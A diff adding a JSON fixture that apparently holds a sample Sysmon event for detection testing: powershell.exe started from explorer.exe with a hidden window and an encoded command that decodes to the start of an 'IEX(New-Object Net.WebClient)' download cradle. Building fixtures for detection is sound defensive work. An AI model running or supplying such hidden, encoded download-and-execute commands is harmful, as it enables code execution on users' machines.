@@ -1,0 +1,12 @@
+[
+  {
+    "source": "sysmon",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==",
+    "parentImage": "C:\\Windows\\explorer.exe",
+    "user": "WIN-DEV\\dev",
+    "pid": 4242,
+    "ppid": 1000,
+    "raw": {"EventID": "1", "IntegrityLevel": "Medium"}
+  }
+]
